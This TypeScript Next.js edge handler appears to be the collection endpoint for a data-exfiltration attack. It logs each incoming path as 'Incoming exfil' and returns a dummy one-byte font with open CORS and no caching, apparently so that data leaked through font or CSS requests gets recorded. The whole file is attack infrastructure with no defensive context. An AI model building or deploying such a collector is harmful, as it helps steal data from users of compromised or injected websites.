import { NextRequest } from 'next/server';

export const config = {
  runtime: 'edge',
};

export default async function handler(req: NextRequest) {
  const url = req.nextUrl.pathname;
  const ts = Date.now();

  console.log("[📥] Incoming exfil to", url);

  const dummyFontData = new Uint8Array([0x00]); // 1-byte placeholder

  return new Response(dummyFontData, {
    status: 200,
    headers: {
      'Content-Type': 'font/woff',
      'Access-Control-Allow-Origin': '*',
      'Cache-Control': 'no-store',
    },
  });
}
